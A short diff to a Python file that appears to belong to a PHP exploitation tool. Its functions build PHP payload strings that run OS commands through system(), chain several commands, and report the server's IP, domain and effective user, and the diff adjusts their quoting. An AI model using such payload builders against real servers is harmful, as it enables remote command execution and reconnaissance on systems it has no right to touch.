@@ -5,10 +5,10 @@ def php_exec( cmd ):
 	cmd = cmd.replace('\\','\\\\').replace('"','\\\"').replace('$','\\$').replace('\\$\\$','$')
 
 	if cmd == 'ip':
-		return "echo {$_SERVER['REMOTE_ADDR']}"
+		return "echo ${_SERVER['REMOTE_ADDR']}"
 
 	elif cmd == 'domain':
-		return "echo {$_SERVER['SERVER_NAME']}"
+		return "echo ${_SERVER['SERVER_NAME']}"
 
 	elif cmd == 'whoami':
 		return '''echo ".posix_getpwuid(posix_geteuid())['name'].";echo ".posix_getpwuid(posix_getegid())['name']."'''
@@ -25,7 +25,7 @@ def php_exec( cmd ):
 	return cmd
 
 def php_system():
-	return 'system("{}");'
+	return "system('{}');"
 
 def cmd_chain( language, iter ):
 	return language.format(';'.join( iter )+';')
